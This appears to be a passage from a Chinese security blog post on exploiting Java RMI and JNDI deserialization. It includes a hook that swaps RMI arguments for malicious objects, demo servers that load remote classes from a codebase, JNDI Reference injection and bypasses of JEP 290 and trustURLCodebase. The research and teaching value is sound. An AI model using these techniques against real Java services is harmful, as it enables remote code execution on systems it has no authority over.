看到一堆 `ac ed 00 05`, 就可以证明漏洞的来源了, 原因就是 RMI 协议是基于 java 自带的序列化的. 如果参数类型是 Object, 直接传 payload 就行了. 如果不是 Object 但是是类型是接口, 我们可以通过 Proxy 给 ysoseiral 的 payload 套一层, 也能直接打服务端. 不过比较麻烦的是 java 的动态代理只能代理 Interface, 所以如果形参类型是 String, HashMap 等就没办法了. 另外可以看到异常 `java.lang.NullPointerException` 是服务提供者发给客户端的, 好像有通过这种方式回显消息的打法, 也是很骚的.  

另外实际以前上在 bind 给 `Registry` 等等地方都是可以打的 (ysoseiral 也有对应的 payload), 因为也都是通过反序列化传数据, 不过在一次更新中 java 官方加了限制 (可以看参考文文章 [7]). 在这种地方只能反序列化在白名单里面的类, 不过仍然找到了通过 JRMPClient 的方法来打. 可惜的是最新版本我测试的情况是 JRMPClient 也给修复了, 可以收到 Registry 发的 JRMP 请求, 但是不能成功反序列化, 甚至连异常都没有, 估计仍然是白名单过滤掉了. 所以这方面目前只能通过我上面的说的参数方式来反序列化打服务提供者了.  

大概是打客户端:  
直接改 ysoseiral.exploit.JRMPListener.java, 返回恶意 gadgets 即可, 这在 JNDI lookup 都时候也可以用.  

打注册局:  
用 ysoseiral.exploit.RMIRegistryExploit.java + 略微修改过的 ysoseiral.exploit.JRMPClient.java.  

打服务提供者:  
把参数用恶意对象替换就可以了, 对参数类型有限制.  

Update:  
看到了国外的研究, https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/  

可以通过 hook 类方法来直接更改传过去的参数, 绕过部分的限制.  
```java
protected static Object unmarshalValue(Class<?> var0, ObjectInput var1) throws IOException, ClassNotFoundException {
    if (var0.isPrimitive()) {
        if (var0 == Integer.TYPE) {
            return var1.readInt();
        } else if (var0 == Boolean.TYPE) {
            return var1.readBoolean();
        } else if (var0 == Byte.TYPE) {
            return var1.readByte();
        } else if (var0 == Character.TYPE) {
            return var1.readChar();
        } else if (var0 == Short.TYPE) {
            return var1.readShort();
        } else if (var0 == Long.TYPE) {
            return var1.readLong();
        } else if (var0 == Float.TYPE) {
            return var1.readFloat();
        } else if (var0 == Double.TYPE) {
            return var1.readDouble();
        } else {
            throw new Error("Unrecognized primitive type: " + var0);
        }
    } else {
        return var0 == String.class && var1 instanceof ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();
    }
}
```

只要不是 Interger, String 等直接用对应方法读出的原始类, 就算不是接口类也能通过运行时强行改参数去打, 刚好可以结合之前写的 rasp 完成.  
```java
package com.rmb122.easyrasp.hooks;

import com.rmb122.easyrasp.annotation.HookHandler;
import com.rmb122.easyrasp.enums.HookType;
import demo.rmb122.DeserializeObject;

import java.util.Arrays;

public class TestHook {
    @HookHandler(hookClass = "java.rmi.server.RemoteObjectInvocationHandler", hookMethod = "invokeRemoteMethod", hookType = HookType.BEFORE_RUN)
    public static Object[] test(Object self, Object[] args) {
        System.out.println("test");
        System.out.println(Arrays.toString((Object[]) args[2]));
        ((Object[]) args[2])[0] = (Object) new DeserializeObject();
        return args;
    }
}
```
虽然弹出异常说类型错误, 但可以成功触发反序列化.  

### 加载远程类

RMIServer.java
```java
package demo.rmb122;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:19132/");

        Registry reg = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");

        while (true) {
            Thread.sleep(10000);
        }
    }
}
```

RMIClient.java
```java
package demo.rmb122;

import java.rmi.RMISecurityManager;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.security.policy", RMIClient.class.getClassLoader().getResource("java.policy").getFile());
        RMISecurityManager securityManager = new RMISecurityManager();
        System.setSecurityManager(securityManager);
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);
        DeserializeObject deserializeObject = new DeserializeObject();
        registry.lookup("test");
    }
}
```

在 Server 设置一个 `java.rmi.server.codebase`, 这样客户端在 lookup 时发现用到了一个本地不存在的类, 会去从这个 codebase 上加载.  
在新版里面已经被修复, 利用起来可以用 `marshalsec`, 更方便.  

## JDNI

### 与 RMI 的关系

JNDI 全名 `Java Naming and Directory Interface`, 可以看到其实就是将多种协议, 例如远程方法调用 (RMI), 公共对象请求代理体系结构 (CORBA), 轻型目录访问协议 (LDAP) 或域名服务 (DNS). 全部封装到一个接口中, 方便使用.  

所以以下代码:  
```java
package demo.rmb122;

import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDI {
    public static void main(String[] args) throws Exception {
        Context context = new InitialContext();
        TestObject object = (TestObject) context.lookup("rmi://localhost:9999/test");
        object.callMe(new DummyImpl());
    }
}
```

与 RMIClient 是完全一样的.  
不同的是 JNDI 在这基础上加了不少功能, 
```java
package demo.rmb122;

import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(10000);
        Reference reference = new Reference("test","com.rmb122", "http://127.0.0.1:19133/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.rebind("wrapper", wrapper);
    }
}
```

比如这个 Reference, 客户端查询 wrapper 时, 因为是 `Reference` 且 com.rmb122 这个工厂类不存在, 将会去 codebase `http://127.0.0.1:19133/` 上加载, 利用方式与 rmi 远程对象加载是一样的.  
在新版中已经修复, 需要手动打开 `System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");`. 而且在我亲测的时候, 就算打开也没用了, 返回的是 `Reference` 对象 233. Debug 了一下发现还需要打开 `com.sun.jndi.ldap.object.trustURLCodebase`, 这才会真正去用 http 协议加载类. 同时因为这是 JNDI 加的内容, 对 RMIClient 是无效的. 会直接返回 Reference 对象.  

### JNDI + LDAP

这其实与 RMI 差不多, 就是换了壳, 不同的地方是 ldap 是有索引等概念的, 可以搜索啊之类的, 且返回的对象也比较复杂, 本身就额外套了一层, 有一些特殊的属性. 具体可以看看底下的参考资料.  
其中值得一说的是有个属性可以附带反序列化对象, 可以用于高版本 jre 下的 fastjson 打本地反序列化 gadget.  

### 本地 Class 作为 Reference Factory

上面的是 Reference 是 `Reference("MyClass","com.rmb122", "http://127.0.0.1:19133/");`, 第二个其实就是工厂类, 这里可以利用 `org.apache.naming.factory.BeanFactory` 这个工厂类来配合, 绕过远程加载的限制. 详细可以看看参考资料 [3].  

## 总结

大概如下:  
RMI remote codebase:  
需要 `java.rmi.server.useCodebaseOnly=true` 且需要设置 SecurityManager, 比较不实用  

RMI 打 Service Provider:  
如果已知一个接口声明, 大部分情况下可以打.  

RMI 打 Registry:  
老版本直接用 ysoserial 的 payload 打, 新版本可以尝试用 JRMP Client 的 payload 改一改尝试绕过.  

JNDI + RMI lookup Reference:  
`com.sun.jndi.rmi.object.trustURLCodebase=false` 直接爆出异常  
`com.sun.jndi.ldap.object.trustURLCodebase=false` 返回 Reference 对象  
如果要利用需要两个选项都 =true  
  
JNDI + LDAP lookup Reference:  
`com.sun.jndi.rmi.object.trustURLCodebase=false` 无影响  
`com.sun.jndi.ldap.object.trustURLCodebase=false` 返回 Reference 对象  
只需要 com.sun.jndi.ldap.object.trustURLCodebase=true 即可利用  

JNDI + LDAP 打本地反序列化, 或者 RMI 反序列化:  
目前无限制  

JNDI + LDAP 打本地 Reference Factory:  
目前无限制  

## 参考资料

[1] https://paper.seebug.org/1091/  
[2] https://kingx.me/Exploit-Java-Deserialization-with-RMI.html  
[3] https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html  
[4] https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java  
[5] https://www.cnblogs.com/Welk1n/p/11066397.html  
[6] http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/  
[7] http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/  
[8] http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/  
